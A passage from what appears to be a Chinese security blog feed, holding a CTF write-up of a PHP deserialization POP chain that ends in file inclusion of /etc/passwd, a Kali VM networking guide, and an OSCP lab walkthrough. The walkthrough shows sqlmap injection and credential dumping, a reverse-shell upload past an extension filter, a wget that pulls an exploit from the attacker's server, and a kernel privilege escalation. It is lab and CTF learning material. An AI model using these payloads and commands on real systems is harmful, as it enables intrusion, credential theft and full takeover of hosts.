$this-&gt;$func();</li></ol><h3 id="3、反序列化中常见的终点函数"><a href="#3、反序列化中常见的终点函数" class="headerlink" title="3、反序列化中常见的终点函数"></a>3、反序列化中常见的终点函数</h3><ol><li>__call 调用不可访问或不存在的方法时被调用</li><li>call_user_func 一般php代码执行都会选择这里</li><li>call_user_func_array 一般php代码执行都会选择这里</li></ol><h2 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h2><h3 id="1、锁定入口类"><a href="#1、锁定入口类" class="headerlink" title="1、锁定入口类"></a>1、锁定入口类</h3><p>先看非class 类的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是获取一个get 参数，之后对其值进行反序列化操作，反序列化一个实例对象出来。既然知道对值进行了反序列化，那么这个<code>wish</code>的值一定是某个对象序列化后的值。通读下文知道，这里有三个class 类，也就是说，答案就是一下三个其中一个class 对象的序列化值。</p><p>那具体是谁？我们知道，有三个入口函数，分别是<code>__wakeup</code>、<code>__destruct </code>和<code>__toString</code>函数。我们逐步分析</p><ol><li><code>__wakeup</code>函数：在反序列化的对象被激活之前，会走<code>__wakeup</code>函数，在三个class 类中，只有<code>Road_is_Long</code>类有这个函数，也就是说<code>Road_is_Long</code>类是可以作为入口类</li><li>__destruct 函数：三个class 类中没有这个函数，所以也就不能用这个来评估入口类</li><li>__toString 函数：这个函数在被作为入口评估函数之前，需要在非class 类的部分中，反序列化后被当做字符串调用才能作为入口评估函数。比如：<code>echo @unserialize($\_GET[&#39;wish&#39;]);</code>，所以在本题中也不能被作为入口评估函数</li></ol><p>这样，我们锁定了入口的class 类 <code>Road_is_Long</code>，那么，我们需要写代码了</p><p>新建一个php文件，把这个入口的class类<code>Road_is_Long</code>复制过去，并删除他所有的魔术方法。再对这个类做实例化和序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723172057611.png" alt="image-20240723172057611"></p><p>OK，好极了，那么这里剩下了两个变量，这两个变量的值是多少需要往下走。</p><h3 id="2、-wakeup-函数"><a href="#2、-wakeup-函数" class="headerlink" title="2、__wakeup 函数"></a>2、__wakeup 函数</h3><p>之后就该读__wakeup入口函数的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup()&#123;</span><br><span class="line">    if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">        echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">$this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里提到了 page 变量，对这个变量进行正则匹配，过滤了很多的协议。如果匹配成功，则更改这个变量的值为<code>index.php</code>。</p><ol><li>思路一：大家可能会尝试绕过这个正则匹配，继续往后走。但问题是不管有没有绕过这个函数，当这个函数走完之后走哪个函数呢？已经到了无路可走的时候了，而这个class 中既无<code>__destruct </code>函数，也无其他的终点函数，代码直接走到头了。</li><li>思路二：page 变量在进行正则匹配的时候，是会被当作字符串去看待。有没有感觉眼熟，没错，如果此时page变量的值正好是某个对象的话，则会触发这个对象的<code>__toString</code>函数。而其本身<code>Road_is_Long</code>是已经被反序列化出来的对象，且具备<code>__toString</code>函数</li></ol><p>则page 变量的内容确定，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这样子，将会走到<code>__toString</code>函数里面去，就剩string变量的内容了</p><h3 id="3、-toString-函数"><a href="#3、-toString-函数" class="headerlink" title="3、__toString 函数"></a>3、__toString 函数</h3><p>之后读__toString 函数的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()&#123;</span><br><span class="line">return $this-&gt;string-&gt;page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常简单，只有一行代码，但是基础薄弱的伙伴看到会感觉懵了很，看不懂。其实这个很简单，我们拆开看</p><ol><li>第一部分：<code>$this-&gt;string</code>，这里其实说的就是这个对象的<code>$string</code>变量，也就是我们剩下的第二个变量。</li><li>第二部分：<code>string-&gt;page</code>，这里是个迷惑行为，这个<code>string</code>指我们的变量，第二个<code>page</code>变量指的是其他。它并不是我们的page变量，而是随意的一个内容均可，如<code>string-&gt;abc</code>，对这个题是没有任何影响。</li></ol><blockquote><p>1、我们知道一个实例化的对象，才可以用-&gt;，如我们写的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br></pre></td></tr></table></figure><p>中$ril是对象，才可以用-&gt;来调用page变量</p><p>2、同样的$this-&gt;string-&gt;page</p><p>意味$this-&gt;string是一个对象，看整体</p><p>$this-&gt;string                     -&gt;page</p><p>​           对象            的         page变量</p></blockquote><p>所以，第二个变量string也是一个对象。那具体是谁的对象？</p><ol><li>思路一：那就看谁的class类里面有page变量咯。但是只有<code>Road_is_Long</code>对象才有page变量啊，啊？这怎么回事儿，感觉脑袋有点懵，怎么又调用回来了？</li><li>思路二：已经走到了反序列化中常见的中间跳板函数。__get 当读取不可访问或不存在属性时被调用。如果这个string 的值是<code>Make_a_Change</code>类的实例对象，而这个类中没有page 变量，但是有<code>get函数</code>啊。这样一来，就走到这个类里面的 <code>get 函数</code>里面了</li></ol><p>则string 的内容确定，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么这个时候又多出来了一个<code>$effort</code>变量，需要确定这个变量的值是多少</p><h3 id="4、-get-函数"><a href="#4、-get-函数" class="headerlink" title="4、__get 函数"></a>4、__get 函数</h3><p>那继续看<code>__get</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)&#123;</span><br><span class="line">$function = $this-&gt;effort;</span><br><span class="line">return $function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正好，这里提到了effort 变量。</p><ol><li>$function &#x3D; $this-&gt;effort; 将effort变量的值给$function 变量，这没啥，可关键在第二行</li><li>return $function(); 这什么鬼，一个变量后面加个()，会不会懵。但我们在往上看中间跳板的那些函数中，有无与这个相关。__invoke：当脚本尝试将对象调用为函数时触发。欸，如果此时effort 变量的值是一个对象的话，$function() 不就相当于把这个对象当成函数来调用了吗。而在<code>Try_Work_Hard</code> 类中正好有这个<code>invoke</code>函数</li></ol><p>此时，effort变量的值确定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意：我们拿过来的类，需要把里面所有的方法都去掉，只留下变量即可。</p><p>这下又多出来一个未知的变量：<code>Try_Work_Hard</code>类里面的 <code>$var</code>变量。继续往后看</p><h3 id="5、-invoke-函数"><a href="#5、-invoke-函数" class="headerlink" title="5、__invoke 函数"></a>5、__invoke 函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __invoke()&#123;</span><br><span class="line">$this-&gt;append($this-&gt;var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是只有一行代码，把本对象的var 变量的值做为参数传入本对象的append 方法中，噢，看来要迎来结局了</p><p>看本对象的append 方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function append($value)&#123;</span><br><span class="line">include($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行了文件包含，看来整个代码的利用核心就在这里，那这个<code>$var</code>的值，就是我们最终的payload了。</p><p>欸，但是又出现了一个点，如下</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$var变量是由protected 进行修饰，我们实例化的对象无法进行调用</p><p>也就是说，我们无法写$twh-&gt;var；这样的代码</p></blockquote><p>所以只能在class类中写入，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var = &quot;file:///etc/passwd&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OK，整个代码分析结束</p><h2 id="四、提交答案"><a href="#四、提交答案" class="headerlink" title="四、提交答案"></a>四、提交答案</h2><p>看下整个代码的输出结果</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183004058.png" alt="image-20240723183004058"></p><p>还挺长的，把双引号中的拿过去</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183240459.png" alt="image-20240723183240459"></p><p>噢， 啥也没有输出。</p><p>这个时候需要把我们的内容做一个url编码，当然也可以直接在代码里面做，在输出的时候添加一个urlencode即可，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var = &quot;file:///etc/passwd&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(urlencode(serialize($ril)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个时候，把我们的这一坨给他</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183424076.png" alt="image-20240723183424076"></p><p>OK，非常的完美</p><p>针对这道题而言，只需要把<code>/etc/passwd</code>换成<code>/flag</code>即可，甚至可使用php伪协议</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183646708.png" alt="image-20240723183646708"></p>]]></content>
      
      
      <categories>
          
          <category> CTF竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】VirtualBox和VMware的kali搭配食用</title>
      <link href="/2024/07/23/Nouns-VirtualBox-VMware-networking/"/>
      <url>/2024/07/23/Nouns-VirtualBox-VMware-networking/</url>
      
        <content type="html"><![CDATA[<h1 id="VirtualBox和VMware的kali搭配食用"><a href="#VirtualBox和VMware的kali搭配食用" class="headerlink" title="VirtualBox和VMware的kali搭配食用"></a>VirtualBox和VMware的kali搭配食用</h1><h2 id="一、VirtualBox虚拟机的配置"><a href="#一、VirtualBox虚拟机的配置" class="headerlink" title="一、VirtualBox虚拟机的配置"></a>一、VirtualBox虚拟机的配置</h2><p>这里任何机器都需要配置成这样</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160128312.png" alt="image-20240723160128312"></p><h2 id="二、VMware的网络配置"><a href="#二、VMware的网络配置" class="headerlink" title="二、VMware的网络配置"></a>二、VMware的网络配置</h2><p>这里需要跟上面VirtualBox虚拟机的配置保持在同一个网卡</p><p>有的小伙伴第一次整，VMware的配置这里可能没有这个网卡，我的建议是重启下电脑</p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160247626.png" alt="image-20240723160247626" style="zoom:150%;" /><h2 id="三、VMware中kali-的配置"><a href="#三、VMware中kali-的配置" class="headerlink" title="三、VMware中kali 的配置"></a>三、VMware中kali 的配置</h2><h3 id="1、桥接网卡（第一块网卡）"><a href="#1、桥接网卡（第一块网卡）" class="headerlink" title="1、桥接网卡（第一块网卡）"></a>1、桥接网卡（第一块网卡）</h3><p>我们需要把网卡配置成桥接模式，注意，是第一块网卡，也就是kali 默认的那块</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160550901.png" alt="image-20240723160550901"></p><h3 id="2、NAT网卡"><a href="#2、NAT网卡" class="headerlink" title="2、NAT网卡"></a>2、NAT网卡</h3><p>配置好第一块网卡之后，再添加一块NAT网卡，是为了方便与网络交互，避免下载某个工具无法上网的问题</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160722820.png" alt="image-20240723160722820"></p><h3 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h3><p>网卡配好之后，打开kali，需要修改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>添加dhcp，如下图所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto eth1</span><br><span class="line">iface eth1 inet dhcp</span><br></pre></td></tr></table></figure><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160955764.png" alt="image-20240723160955764"></p><p>之后重启网络即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart networking.service</span><br></pre></td></tr></table></figure><p>当然，有的小伙伴这里重启之后感觉没啥用，网段也没变化等待；</p><p>建议在开启VirtualBox虚拟机之后，再开启kali</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VirtualBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-BTRsys1</title>
      <link href="/2024/07/22/OSCP-BTRsys1/"/>
      <url>/2024/07/22/OSCP-BTRsys1/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—BTRsys1"><a href="#OSCP系列靶机—BTRsys1" class="headerlink" title="OSCP系列靶机—BTRsys1"></a>OSCP系列靶机—BTRsys1</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-BTRsys1/image-20240722153014361.png" alt="image-20240722153014361"></p><h2 id="二、端口探测"><a href="#二、端口探测" class="headerlink" title="二、端口探测"></a>二、端口探测</h2><p>1、快速扫描</p><p><img src="/img/OSCP-BTRsys1/image-20240722153056004.png" alt="image-20240722153056004"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-BTRsys1/image-20240722153129282.png" alt="image-20240722153129282"></p><p>共开放三个端口</p><p>3、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 21,22,80 192.168.31.72</span><br></pre></td></tr></table></figure><p>上面给出了端口对应的服务信息，就不再进行服务版本探测了</p><p><img src="/img/OSCP-BTRsys1/image-20240722153235844.png" alt="image-20240722153235844"></p><p>ftp 存在任意用户登陆，其他端口没啥信息</p><p><img src="/img/OSCP-BTRsys1/image-20240722153311271.png" alt="image-20240722153311271"></p><h2 id="三、FTP信息收集"><a href="#三、FTP信息收集" class="headerlink" title="三、FTP信息收集"></a>三、FTP信息收集</h2><p><img src="/img/OSCP-BTRsys1/image-20240722153520227.png" alt="image-20240722153520227"></p><p>啥也没有，不应该啊；尝试文件上传</p><p><img src="/img/OSCP-BTRsys1/image-20240722153652206.png" alt="image-20240722153652206"></p><p>权限被拒绝，无法上传</p><h2 id="四、HTTP信息收集"><a href="#四、HTTP信息收集" class="headerlink" title="四、HTTP信息收集"></a>四、HTTP信息收集</h2><h3 id="1、首页及源代码"><a href="#1、首页及源代码" class="headerlink" title="1、首页及源代码"></a>1、首页及源代码</h3><p><img src="/img/OSCP-BTRsys1/image-20240722153815998.png" alt="image-20240722153815998"></p><p>他这里还一直在转圈圈，加载慢了很，估计是后端有一直在执行的操作；看源代码</p><p><img src="/img/OSCP-BTRsys1/image-20240722154006002.png" alt="image-20240722154006002"></p><p>噢，我说怎么加载这么慢，原来是css、js等请求了外部链接；纵观这个源代码，只有a标签的<code>hakkimizda.php</code>链接是我们感兴趣的</p><h3 id="2、hakkimizda-php-文件"><a href="#2、hakkimizda-php-文件" class="headerlink" title="2、hakkimizda.php 文件"></a>2、hakkimizda.php 文件</h3><p><img src="/img/OSCP-BTRsys1/image-20240722154331817.png" alt="image-20240722154331817"></p><p>这里疑似有文件包含的嫌疑，它的头部跟首页是一样的；把这段话拿给AI解析下</p><p><img src="/img/OSCP-BTRsys1/image-20240722154607262.png" alt="image-20240722154607262"></p><p>是一段土耳其语言说的一段话，后面的渗透测试步骤这里似乎给了提示，不知道是否与此靶场有关</p><p><img src="/img/OSCP-BTRsys1/image-20240722154735567.png" alt="image-20240722154735567"></p><h3 id="3、做目录扫描"><a href="#3、做目录扫描" class="headerlink" title="3、做目录扫描"></a>3、做目录扫描</h3><p>到这里基本上没线索了，做一遍目录扫描</p><p><img src="/img/OSCP-BTRsys1/image-20240722155256963.png" alt="image-20240722155256963"></p><p>倒是发现几个有趣的文件和文件夹；挑有价值的讲一下</p><h3 id="4、login-php-文件"><a href="#4、login-php-文件" class="headerlink" title="4、login.php 文件"></a>4、login.php 文件</h3><p><img src="/img/OSCP-BTRsys1/image-20240722155731439.png" alt="image-20240722155731439"></p><p>本想尝试下弱口令，但是发现这个地方没有走后端；校验是在前端中</p><p><img src="/img/OSCP-BTRsys1/image-20240722160028558.png" alt="image-20240722160028558"></p><p>看源代码；原来是在前端先校验了下用户名中<code>@</code>后面是不是<code>btrisk.com</code>，符合要求才向后端提交</p><p><img src="/img/OSCP-BTRsys1/image-20240722160157681.png" alt="image-20240722160157681"></p><p>我们随便用一个账号如 <code>123@btrisk.com</code> 任意密码，来到了后端的<code>personel.php</code>文件</p><p><img src="/img/OSCP-BTRsys1/image-20240722160643305.png" alt="image-20240722160643305"></p><p>这里有个报错，说缺少参数；下面没有显示具体的字段信息；应该是用户名符合要求所以进来这个页面，但是因为密码不正确所以没有添加上必要的参数；既然如此，用sqlmap 跑一下看是否存在sql注入漏洞</p><h3 id="5、SQL注入漏洞"><a href="#5、SQL注入漏洞" class="headerlink" title="5、SQL注入漏洞"></a>5、SQL注入漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.31.72/personel.php --data &quot;kullanici_adi=admin@btrisk.com&amp;parola=123456&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722161550783.png" alt="image-20240722161550783"></p><p>OK，结果也是非常明显，存在SQL注入，那查看用户的信息</p><p>当我们查到字段的时候，发现有这么些字段，看哪个字段呢？</p><p><img src="/img/OSCP-BTRsys1/image-20240722161752570.png" alt="image-20240722161752570"></p><p>在登录框中已经给出了答案</p><p><img src="/img/OSCP-BTRsys1/image-20240722161726319.png" alt="image-20240722161726319"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.31.72/personel.php --data &quot;kullanici_adi=admin@btrisk.com&amp;parola=123456&quot; --batch -D &quot;deneme&quot; -T &quot;user&quot; -C &quot;Kullanici_Adi,Parola&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722161902674.png" alt="image-20240722161902674"></p><p>俩用户，密码都一样的昂</p><h3 id="6、登陆后台"><a href="#6、登陆后台" class="headerlink" title="6、登陆后台"></a>6、登陆后台</h3><p>登陆之后，后台果然变了，有文件上传</p><p><img src="/img/OSCP-BTRsys1/image-20240722162028206.png" alt="image-20240722162028206"></p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>本想上传一个txt文件试试水，但给我拦截了，说只能<code>jpg,png</code>格式</p><p><img src="/img/OSCP-BTRsys1/image-20240722162204112.png" alt="image-20240722162204112"></p><p>我把txt 后缀改成jpg，继续上传</p><p><img src="/img/OSCP-BTRsys1/image-20240722162332979.png" alt="image-20240722162332979"></p><p>上传成功，但是没给路径；欸，这个时候想起来做目录扫描中发现的<code>/uploads/</code>目录了，去看下</p><p><img src="/img/OSCP-BTRsys1/image-20240722162420803.png" alt="image-20240722162420803"></p><p>果然在这里；那上传php 反弹shell 文件；注意改成自己的IP和端口</p><p><img src="/img/OSCP-BTRsys1/image-20240722162536677.png" alt="image-20240722162536677"></p><p>上传用bp 抓包改后缀</p><p><img src="/img/OSCP-BTRsys1/image-20240722162724345.png" alt="image-20240722162724345"></p><p>访问webshell，并用nc 进行监听，成功getshell</p><p><img src="/img/OSCP-BTRsys1/image-20240722162851050.png" alt="image-20240722162851050"></p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-BTRsys1/image-20240722163226329.png" alt="image-20240722163226329"></p><p>发现数据库的账号码，而且还是root 高权限用户</p><p><img src="/img/OSCP-BTRsys1/image-20240722163957837.png" alt="image-20240722163957837"></p><p>但是运行mysql 的用户是<code>mysql</code>，依然是低权限用户，无法通过数据库进行提权；但是看到这个linux 的内核版本较低，是否可以使用脏牛提权呢？</p><h3 id="2、脏牛提权至root"><a href="#2、脏牛提权至root" class="headerlink" title="2、脏牛提权至root"></a>2、脏牛提权至root</h3><p>查询有关该内核版本提权的脚本</p><p><img src="/img/OSCP-BTRsys1/image-20240722164254080.png" alt="image-20240722164254080"></p><p>有俩，感觉能成功，尝试第一个</p><p><img src="/img/OSCP-BTRsys1/image-20240722164507055.png" alt="image-20240722164507055"></p><p>脚本上写了食用方法，照着来就行，将脚本上传至靶机后编译运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 攻击机</span><br><span class="line">python3 -m http.server</span><br><span class="line">// 靶机</span><br><span class="line">cd /tmp;wget http://192.168.31.58:8000/37292.c</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722165100748.png" alt="image-20240722165100748"></p><p>欸，没有gcc 文件，那用cc ；把这里的gcc 改成 cc；之后重新来一遍</p><p><img src="/img/OSCP-BTRsys1/image-20240722172104166.png" alt="image-20240722172104166"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//cc执行</span><br><span class="line">cc 37292.c -o ofs</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722172408177.png" alt="image-20240722172408177"></p><p>提权成功</p><p><img src="/img/OSCP-BTRsys1/image-20240722172430686.png" alt="image-20240722172430686"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-LemonSqueezy</title>
      <link href="/2024/07/22/OSCP-LemonSqueezy/"/>
      <url>/2024/07/22/OSCP-LemonSqueezy/</url>
      
